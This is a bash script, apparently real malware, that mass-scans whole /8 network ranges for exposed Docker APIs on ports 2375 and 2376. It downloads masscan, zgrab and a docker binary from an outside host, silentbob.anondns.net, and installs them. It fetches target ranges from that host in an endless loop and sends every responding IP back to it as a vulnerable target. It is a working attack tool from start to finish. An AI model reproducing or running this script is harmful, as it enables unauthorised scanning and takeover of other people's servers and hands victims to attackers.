#!/bin/bash

function setupsomething(){
yum install -y gcc make git libpcap libpcap-devel curl jq 2>/dev/null
apt install -y gcc make git libpcap0.8 libpcap0.8-dev masscan curl jq 2>/dev/null

if ! type masscan 2>/dev/null 1>/dev/null ; then cd /tmp/ 2>/dev/null ; wget -q http://silentbob.anondns.net/bin/1.0.4.tar.gz -O /tmp/1.0.4.tar.gz ; tar xf /tmp/1.0.4.tar.gz ; cd /tmp/masscan-1.0.4/ ; make ; make install ; fi
if ! type docker 2>/dev/null 1>/dev/null ; then wget -q http://silentbob.anondns.net/bin/docker -O /usr/bin/docker ; chmod +x /usr/bin/docker ; fi
if ! type zgrab 2>/dev/null 1>/dev/null ; then wget -q http://silentbob.anondns.net/bin/zgrab -O /usr/bin/zgrab ; chmod +x /usr/bin/zgrab ; fi

}


function dAPIpwn(){
range=$1
port=$2
rate=$3
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan $range -p$port --rate=$rate | awk '{print $6}'| \
zgrab --senders 200 --port $port --http='/v1.16/version' --output-file=- 2>/dev/null | \
grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";

for ipaddy in ${!rndstr} ; do
TARGET=$ipaddy:$port
timeout -s SIGKILL 240 docker -H $ipaddy:$port images
CHECKHP=$?
if [ "$CHECKHP" == "0" ]; then curl "http://silentbob.anondns.net/insert/results.php?IP=$ipaddy&PORT=$port&VULN=DockerAPI" ; fi
done
}

setupsomething


while true; do
RANGE=$(curl -sLk http://silentbob.anondns.net/gr.php)
dAPIpwn $RANGE".0.0.0/8" 2375 500000
dAPIpwn $RANGE".0.0.0/8" 2376 500000
unset RANGE
done
